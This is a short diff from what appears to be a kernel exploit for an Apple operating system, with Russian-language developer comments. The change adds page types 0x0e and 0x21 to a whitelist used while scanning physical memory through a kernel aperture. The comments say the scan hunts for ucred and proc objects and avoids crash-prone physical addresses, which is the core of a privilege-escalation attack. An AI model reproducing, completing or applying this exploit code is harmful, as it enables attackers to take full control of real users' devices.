@@ -8266,7 +8266,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // kernel aperture безопасен. Deadly-эвристика
                             // 1.9.178b путала walker/DART-контекст. Порядок
                             // проверок перевёрнут: whitelist побеждает.
-                            BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2);
+                            // 2.0.7: 0xb (345k кадров) прочитан целиком —
+                            // ucred там НЕТ. Гистограмма: 0x0e=64k кадров
+                            // (13% RAM, зонные данные) и 0x21=9k (тип
+                            // proc-объекта из census) — вот они и добавлены.
+                            // 1GB-пол закрывает нижние минные PA.
+                            BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2 ||
+                                                t == 0x0e || t == 0x21);
                             if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
                             if (!whitelisted) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
